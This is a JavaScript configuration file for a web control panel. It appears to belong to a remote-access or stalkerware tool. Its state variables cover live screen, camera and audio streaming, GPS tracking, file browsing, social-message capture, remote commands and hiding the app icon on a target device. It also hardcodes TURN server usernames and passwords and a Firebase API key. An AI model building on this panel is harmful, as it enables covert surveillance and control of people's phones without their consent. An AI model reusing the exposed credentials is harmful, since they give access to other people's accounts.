// ==================== GLOBAL CONFIGURATION ====================
window.CONFIG = {
    WS_URL: "wss://mirror-view.onrender.com",
    MAX_RECONNECT_DELAY: 30000,
    ICE_SERVERS: [
        { urls: "stun:stun.l.google.com:19302" },
        { urls: "stun:stun1.l.google.com:19302" },
        { urls: "stun:stun.relay.metered.ca:80" },
        { urls: "turn:global.relay.metered.ca:80", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turn:global.relay.metered.ca:80?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turn:global.relay.metered.ca:443", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turns:global.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
    ],
    FIREBASE_CONFIG: {
        apiKey: "AIzaSyCHjKvbe3ZIlCE6aN5euzEF2d-bt-u9ROc",
        authDomain: "webviewiot.firebaseapp.com",
        projectId: "webviewiot",
        storageBucket: "webviewiot.firebasestorage.app",
        messagingSenderId: "634777347775",
        appId: "1:634777347775:web:f8efc5bcdf19e3f1de880a"
    }
};

// Initialize Firebase
firebase.initializeApp(window.CONFIG.FIREBASE_CONFIG);
window.auth = firebase.auth();
window.db = firebase.firestore();
window.storage = firebase.storage();

// Global variables
window.currentUser = null;
window.selectedDeviceId = null;
window.ws = null;
window.reconnectTimer = null;
window.reconnectAttempts = 0;
window.screenPC = null;
window.cameraPC = null;
window.audioPC = null;
window.fileTransfers = {};
window.mapInstance = null;
window.currentData = [];
window.currentPage = 0;
window.dataType = null;
window.currentPath = "root";
window.selectedFiles = [];
window.screenActive = false;
window.iconHidden = false;
window.flashOn = false;
window.isLoginMode = true;
window.liveGpsActive = false;
window.mediaRecorder = null;
window.recordedChunks = [];
window.pendingCommand = null;
window.newAlerts = [];
window.screenMediaRecorder = null;
window.screenRecordedChunks = [];
window.currentCameraStream = null;
window.currentAudioStream = null;
window.socialMsgsData = [];
window.currentLocation = null;
window.deviceInfoRefreshInterval = null;
window.currentMapType = 'street';
window.liveMap = null;
window.liveMarker = null;
window.liveCircle = null;
window.followLocation = false;
window.fileTreeCache = {};

window.panel = document.getElementById('main-panel');
window.statusEl = document.getElementById('status');
window.wsDebug = document.getElementById('wsDebug');
